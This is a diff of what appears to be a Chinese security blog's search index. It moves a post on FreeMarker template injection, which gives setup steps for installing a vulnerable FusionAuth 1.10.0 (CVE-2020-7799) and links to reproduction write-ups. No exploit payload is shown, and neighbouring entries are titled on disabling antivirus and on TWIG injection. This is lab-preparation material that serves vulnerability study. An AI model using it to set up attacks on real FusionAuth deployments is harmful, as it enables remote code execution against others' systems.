-<img src="/2022/02/21/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BFreemaker/image-20220221161405215.png" class title="image-20220221161405215">
-
-
-
-<p>进入bin目录，执行startup.sh脚本开始安装</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./startup.sh</span><br></pre></td></tr></table></figure>
-
-<img src="/2022/02/21/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BFreemaker/image-20220221161600923.png" class title="image-20220221161600923">
-
-
-
-<p>进入bin目录，执行startup.sh脚本开始安装</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./startup.sh</span><br></pre></td></tr></table></figure>
-
-<img src="/2022/02/21/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BFreemaker/image-20220221151633154.png" class title="image-20220221151633154">
-
-
-
-<p>然后浏览器访问9011端口，配置数据库和ElasticSearch连接</p>
-<img src="/2022/02/21/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BFreemaker/image-20220221151741345.png" class title="image-20220221151741345">
-
-
-
-
-
-
-
-
-
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/107742893">(60条消息) FusionAuthRCE(CVE-2020-7799)复现_锋刃科技的博客-CSDN博客_fusionauth</a></p>
-<p>[(60条消息) <a href="https://blog.csdn.net/caiqiiqi/article/details/104186575">CVE-2020-7799] Apache FreeMarker模板FusionAuth远程代码执行_公众号shadow sock7-CSDN博客</a></p>
-<p><a href="https://gitee.com/itdragon/springmvc">springmvc: 学习SpringMVC代码 (gitee.com)</a></p>
-]]></content>
-  </entry>
-  <entry>
     <title>杀软 及防火墙关闭</title>
     <url>/2021/11/01/%E6%9D%80%E8%BD%AF%E5%8F%8A%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%AD/</url>
     <content><![CDATA[<h1 id="杀软及防火墙关闭"><a href="#杀软及防火墙关闭" class="headerlink" title="杀软及防火墙关闭"></a>杀软及防火墙关闭</h1><hr>
@@ -3568,6 +3512,62 @@
       <tags>
         <tag>-内网渗透 -杀毒杀软</tag>
       </tags>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2022/02/21/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BFreemaker/</url>
+    <content><![CDATA[<h1 id="模板注入之Freemaker"><a href="#模板注入之Freemaker" class="headerlink" title="模板注入之Freemaker"></a>模板注入之Freemaker</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>FreeMarker 是一款 模板引擎：即一种基于模板和要改变的数据， 并用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。</p>
+<p>模板编写为FreeMarker Template Language (FTL)。它是简单的，专用的语言， <em>不是</em> 像PHP那样成熟的编程语言。 那就意味着要准备数据在真实编程语言中来显示，比如数据库查询和业务运算， 之后模板显示已经准备好的数据。在模板中，你可以专注于如何展现数据， 而在模板之外可以专注于要展示什么数据。</p>
+<img src="/2022/02/21/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BFreemaker/image-20220221142325248.png" class title="image-20220221142325248">
+
+<p>这种方式被称为 MVC (模型 视图 控制器) 模式，对于动态网页来说，是一种特别流行的模式。 它帮助从开发人员(Java 程序员)中分离出网页设计师(HTML设计师)。设计师无需面对模板中的复杂逻辑， 在没有程序员来修改或重新编译代码时，也可以修改页面的样式。</p>
+<p>而FreeMarker最初的设计，是被用来在MVC模式的Web开发框架中生成HTML页面的，它没有被绑定到 Servlet或HTML或任意Web相关的东西上。它也可以用于非Web应用环境中。</p>
+<p>FreeMarker 是 免费的， 基于Apache许可证2.0版本发布。</p>
+<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>FusionAuth存在Freemaker模板注入，涉及版本FusionAuth &lt;&#x3D; 1.11.0。</p>
+<p>FusionAuth是一个免费的身份管理平台，安装简单，易于集成。FusionAuth提供登录、注册、MFA、SSO、电子邮件模板、本地化、密码控制、强哈希、网络挂钩、基于角色的访问控制等功能。</p>
+<p><strong>下载命令</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://storage.googleapis.com/inversoft_products_j098230498/products/fusionauth /1.10.0/fusionauth-app-1.10.0.zip</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/02/21/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BFreemaker/image-20220221143010639.png" class title="image-20220221143010639">
+
+
+
+<p>下载elasticsearch插件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://storage.googleapis.com/inversoft_products_j098230498/products/fusionauth /1.10.0/fusionauth-search-1.10.0.zip</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/02/21/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BFreemaker/image-20220221161405215.png" class title="image-20220221161405215">
+
+
+
+<p>进入bin目录，执行startup.sh脚本开始安装</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./startup.sh</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/02/21/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BFreemaker/image-20220221161600923.png" class title="image-20220221161600923">
+
+
+
+<p>进入bin目录，执行startup.sh脚本开始安装</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./startup.sh</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/02/21/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BFreemaker/image-20220221151633154.png" class title="image-20220221151633154">
+
+
+
+<p>然后浏览器访问9011端口，配置数据库和ElasticSearch连接</p>
+<img src="/2022/02/21/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BFreemaker/image-20220221151741345.png" class title="image-20220221151741345">
+
+
+
+
+
+
+
+
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/107742893">(60条消息) FusionAuthRCE(CVE-2020-7799)复现_锋刃科技的博客-CSDN博客_fusionauth</a></p>
+<p>[(60条消息) <a href="https://blog.csdn.net/caiqiiqi/article/details/104186575">CVE-2020-7799] Apache FreeMarker模板FusionAuth远程代码执行_公众号shadow sock7-CSDN博客</a></p>
+<p><a href="https://gitee.com/itdragon/springmvc">springmvc: 学习SpringMVC代码 (gitee.com)</a></p>
+]]></content>
   </entry>
   <entry>
     <title>模板注入之TWIG</title>
